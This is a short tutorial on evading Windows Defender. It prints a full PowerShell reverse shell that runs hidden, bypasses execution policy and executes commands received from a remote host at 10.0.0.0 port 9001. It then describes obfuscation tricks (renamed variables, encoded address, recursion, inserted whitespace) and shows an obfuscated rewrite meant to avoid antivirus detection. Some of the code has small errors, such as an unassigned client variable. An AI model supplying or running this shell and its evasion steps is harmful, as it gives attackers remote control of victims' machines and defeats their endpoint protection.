# Windows Defender Bypass
To bypass windows defender we will use a technique called obfuscation. 
For example we have a simple code in Powershell that creates a reverse shell:
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.0",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

To obfuscate this code we would use a combination of techniques such as:

- Replacing human-readable variable names with random or difficult-to-understand names: $stream would become something like $x, $bytes would become $y, and so on.

- Encrypting the IP address and port number using a simple encryption algorithm or base64 encoding, so that it is not immediately recognizable.

- Using complex or nested statements and functions to make the code more difficult to follow and understand. For example, instead of using the while loop as is, I could replace it with a recursive function that calls itself until the stream is closed.

- Inserting comments or whitespace in random places throughout the code to break up the logical flow and make it harder to read.

Here is an example of how the code could be obfuscated using these techniques:

### Randomly generated variable names
```$x = New-Object System.Net.Sockets.TCPClient("10.0.0.0",9001);
$y = $x.GetStream();
[byte[]]$z = 0..65535|%{0};
```

### Recursive function to handle stream data
```
function recurse($stream) {
	if(($i = $stream.Read($z, 0, $z.Length)) -ne 0){
		$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($z,0, $i);
		$sendback = (iex $data 2>&1 | Out-String );
		$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
		$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
		$stream.Write($sendbyte,0,$sendbyte.Length);
		$stream.Flush();
		recurse($stream); # Recursive call
	}
}
```

### Call the recursive function to handle the stream
```
recurse($y);
$x.Close();
```